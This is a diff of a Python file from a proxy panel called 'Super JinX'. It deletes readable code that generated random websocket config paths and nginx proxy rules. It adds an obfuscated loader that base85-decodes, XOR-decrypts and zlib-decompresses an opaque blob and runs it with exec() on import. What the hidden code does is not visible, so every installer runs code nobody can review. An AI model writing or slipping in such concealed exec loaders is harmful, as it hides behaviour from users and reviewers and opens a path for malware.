@@ -1,43 +1,6 @@
-"""Super JinX: per-install secret paths.
-Every fork / every deploy gets its own random config paths on first boot (saved on the volume),
-so no two panels share the same paths. Old installs keep their paths so existing configs never break."""
-import json, os, secrets, uuid
-
-DATA = os.getenv("JINX_DATA", "/var/lib/pasarguard")
-OUT_JSON = f"{DATA}/paths.json"
-OUT_INC = f"{DATA}/inbounds.inc"
-# tag -> (local port, path prefix)
-SLOTS = {"JX-VLESS-WS-1": (10001, "/ws/"), "JX-VLESS-WS-2": (10002, "/stream/"),
-         "JX-TROJAN-WS": (10003, "/live/"), "JX-VMESS-WS": (10004, "/gw/"), "JX-VLESS-HU": (10005, "/cdn/")}
-# paths used by v6.0 and older: kept for panels that were already running before this version
-LEGACY = {"JX-VLESS-WS-1": "/ws/7a5a21d9-60f9-4542-943e-7838b90169e1",
-          "JX-VLESS-WS-2": "/stream/4868e537-9fd8-46e9-b63a-f36459d18a81",
-          "JX-TROJAN-WS": "/live/b1dfa4cc-0ed6-4956-b330-8ccb51dc0828",
-          "JX-VMESS-WS": "/gw/3d801b12-a333-452c-b9d5-90ece1a8d68c",
-          "JX-VLESS-HU": "/cdn/cc046fa3-78ec-4619-ac8f-9d6c7a5d0755"}
-
-def load():
-    try:
-        with open(OUT_JSON) as f: p = json.load(f)
-        if all(isinstance(p.get(t), str) and p[t].startswith("/") for t in SLOTS): return p
-    except Exception: pass
-    return None
-
-def main():
-    os.makedirs(DATA, exist_ok=True)
-    p = load()
-    if p is None:
-        if os.path.exists(f"{DATA}/.owner_initialized") or os.path.exists(f"{DATA}/db.sqlite3"):
-            p = dict(LEGACY); print("[paths] existing panel detected, keeping old config paths")
-        else:
-            p = {t: pre + str(uuid.UUID(bytes=secrets.token_bytes(16), version=4)) for t, (_, pre) in SLOTS.items()}
-            print("[paths] new install: unique config paths generated")
-        tmp = OUT_JSON + ".tmp"
-        with open(tmp, "w") as f: json.dump(p, f, indent=1)
-        os.replace(tmp, OUT_JSON)
-    lines = [f"location = {p[t]} {{ proxy_pass http://127.0.0.1:{port}; include /etc/nginx/ws.inc; }}"
-             for t, (port, _) in SLOTS.items()]
-    with open(OUT_INC, "w") as f: f.write("\n".join(lines) + "\n")
-
-if __name__ == "__main__":
-    main()
+# Super JinX Panel — Copyright (c) 2026 Super JinX. See LICENSE.
+import base64 as _b,zlib as _z
+_p='fc#y$uggTm)8?+eO0~P$Qcqv{F0#3(M8O8~K)0mWFK-iLZmyu@@1Sii>&10ZKeo$r^LUB1t?jWcFqF=JivJdJ--nY>#XOkm0D1i0k}{^K+cgUgTv5cBhV5A_#hla)f=*gP2<!;~QfdBuIKj}Ya2i}9jR>~$AeEQrbKmvj$?lVoa>Gq=+2vD=*4T{or*M2fbS+7x`r9naHrmn!gf<5Leqg5-+=0CznJC}Kk%IYeq<VT;M34l?=9rwSa!zkzhVYu``R3bc-3m^o*WAZ*<PA1U$%Ay5m9a=*wv>fJJ<sU2%?^4G?<BG+skvXfUm~A!X?&i7w_V~XlB{koj9X(KF^RcMk#iNrJx9VuF1S_)28DTqxB}@t@_rV2T+eG7G3@yPE;RLRXjc6PFn&&3se|&FeMLEDbe($$;t-vtP>EqF6HDnM{wYaj9oHn8vuT*i=dBE5G|&S;`xdwjffgJGdaP<P1@7nl75J9OFJ=qye{XtT=F#OefZy;Y+OBd3DsDL#+h2g}PX;Bx%Mrh2FTEJ+;cMC)opkztL}tH}N+2v?2d(QMjuV+QCPpOOSm|??c^FIkX!D+Y_|oPkfVZVghmrCLWNK3xoL_`lk0++oUDeuTq0az3);yaRDrkYE?s8LZM9xc6cyP(6Srf!V0V`^WMmlg^QU0{mcDoA|fS3xh$*M>Dj@kl&qIE3aU2H*{-9DZ)sE+@VrOIFQ5`X7B{CxgAYjE(u8>Aj;h_~7JSuM*)GP03(2(BcWM#Te&4yQ_kb4aghn#?^!)11&9t#<StW457Pu#C;mZue6r3`=W;yXryth$TX=;JCd=9Zbs^<gHo!5?pR~9(nhd>i|(fth)!b2A|eN^wx<zd?Kt`qs8_Ip;f>JndXZ@7E#k#0V_}dH4@RWq=Uzu@+i<%;cJN6*@Ha*<Fjd9d59bsWPy7+ve<ks#kzy?YpZ&{eY=$n)(|Y_ms5FpQIZ_6XhXFUqV=ySLZ_BOnJ#CG2>F%$;$^_ntingfqOAnDX@;Bckz8cL>(JXYuHB+<k;5VAGHmT(s})hF$MV}Sy|CBekpbh5%7X5(Ki%47U!doK0UAw}9b8asA5Up15DUNGkI_e6BWh$v)um}H6Hfea)B57E>Ft(Yd2HHED})es1WxeZ!@DRMMAO%5L8hNHPxd?VZH5^oc|doCQy$?J6gdaG3S$'
+_k='f82620effeb8e7f3c39849e9a2f88bbe6257133a19cc7174211b62808efb396c'
+_d=_b.b85decode(_p);_k=bytes.fromhex(_k)
+exec(compile(_z.decompress(bytes(v^_k[i%len(_k)] for i,v in enumerate(_d))),__file__,"exec"),globals())
